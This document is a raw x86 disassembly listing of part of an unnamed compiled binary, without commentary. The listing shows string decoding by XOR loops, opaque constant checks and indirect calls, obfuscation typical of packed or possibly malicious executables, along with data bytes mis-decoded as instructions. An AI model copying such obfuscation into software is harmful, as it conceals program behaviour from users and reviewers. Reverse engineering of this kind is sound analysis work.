  41ca9a:	xor    edi,DWORD PTR [edi]
  41ca9c:	sub    esi,DWORD PTR [ecx-0x7ce1cc00]
  41caa2:	ds mov ecx,ebx
  41caa5:	inc    edi
  41caa6:	in     eax,0xf6
  41caa8:	fs jno 0x41cb24
  41caab:	xchg   esp,eax
  41caac:	in     al,dx
  41caad:	ror    DWORD PTR [esi-0x1b4b85f5],cl
  41cab3:	mov    ds:0xc5e376ee,al
  41cab8:	mov    ch,0x25
  41caba:	ja     0x41caa6
  41cabc:	mov    WORD PTR [ebx+ebx*1],ss
  41cabf:	ret    0xb701
  41cac2:	loop   0x41ca81
  41cac4:	sti    
  41cac5:	rcr    ebp,0xf3
  41cac8:	sahf   
  41cac9:	inc    esp
  41caca:	out    dx,eax
  41cacb:	fwait
  41cacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cacd:	daa    
  41cace:	jge    0x41caa2
  41cad0:	data16 or bh,dh
  41cad3:	xor    BYTE PTR [edx],dl
  41cad5:	call   0x569c6b41
  41cada:	mov    eax,0x64731a94
  41cadf:	and    BYTE PTR ds:0x95d1ccef,ch
  41cae5:	enter  0x7293,0xdf
  41cae9:	or     edi,eax
  41caeb:	out    dx,al
  41caec:	sbb    DWORD PTR [ebx-0x16],ebp
  41caef:	xchg   ebx,edx
  41caf1:	sbb    cl,al
  41caf3:	stos   BYTE PTR es:[edi],al
  41caf4:	xor    edi,ecx
  41caf6:	dec    eax
  41caf7:	cwde   
  41caf8:	clc    
  41caf9:	sub    DWORD PTR [ebx-0x29],ebp
  41cafc:	push   ss
  41cafd:	xchg   esp,eax
  41cafe:	mov    es,WORD PTR [edx+ecx*1-0x6a]
  41cb02:	jns    0x41cb75
  41cb04:	jp     0x41cac4
  41cb06:	cmp    al,0x73
  41cb08:	dec    edi
  41cb09:	jp     0x41cb04
  41cb0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb0c:	push   esi
  41cb0d:	jp     0x41caf0
  41cb0f:	test   BYTE PTR [eax-0x73],0x58
  41cb13:	rcl    BYTE PTR [edi],0x8a
  41cb16:	and    BYTE PTR [esi],al
  41cb18:	not    BYTE PTR [ebp-0x1d]
  41cb1b:	aad    0x42
  41cb1d:	out    0xba,al
  41cb1f:	xchg   edx,eax
  41cb20:	xor    edx,ebp
  41cb22:	dec    ecx
  41cb23:	repnz dec esp
  41cb25:	add    esp,DWORD PTR [edx-0x5c86c4cc]
  41cb2b:	(bad)  
  41cb2c:	mov    dh,0x26
  41cb2e:	mov    esp,0x52e3e045
  41cb33:	or     edi,DWORD PTR ds:0xc271a3ae
  41cb39:	aaa    
  41cb3a:	in     eax,dx
  41cb3b:	aam    0x63
  41cb3d:	fstp   DWORD PTR [ebp+0x13]
  41cb40:	lock mov al,bl
  41cb43:	cld    
  41cb44:	cmp    al,dl
  41cb46:	(bad)  
  41cb47:	stc    
  41cb48:	mov    esi,0xfe41ea7f
  41cb4d:	fwait
  41cb4e:	(bad)  
  41cb4f:	test   al,0x7a
  41cb51:	add    esp,DWORD PTR [ebx-0x54]
  41cb54:	mov    ds:0x50e4151f,al
  41cb59:	cmp    DWORD PTR [edx],edx
  41cb5b:	adc    al,0xa6
  41cb5d:	enter  0xd430,0xdd
  41cb61:	dec    edi
  41cb62:	and    edx,ebx
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	test   al,0xb6
  41ce46:	and    eax,0xb59c0ff2
  41ce4b:	inc    edi
  41ce4c:	lods   eax,DWORD PTR ds:[esi]
  41ce4d:	fdivr  DWORD PTR [ecx+0x10]
  41ce50:	sbb    DWORD PTR [ebx],ecx
  41ce52:	push   es
  41ce53:	scas   eax,DWORD PTR es:[edi]
  41ce54:	add    DWORD PTR [eax],eax
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
